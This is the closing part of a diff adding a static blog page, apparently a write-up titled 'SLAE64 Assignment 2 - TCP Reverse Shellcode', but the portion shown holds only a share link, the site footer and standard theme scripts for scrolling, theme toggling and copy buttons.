+        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae64%2fslae_64_assignment_2%2f&amp;title=SLAE64%20Assignment%202%20-%20TCP%20Reverse%20Shellcode&amp;summary=SLAE64%20Assignment%202%20-%20TCP%20Reverse%20Shellcode&amp;source=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae64%2fslae_64_assignment_2%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+        </svg>
+    </a>
+</div>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://0xnibbles.github.io/">nibbles</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
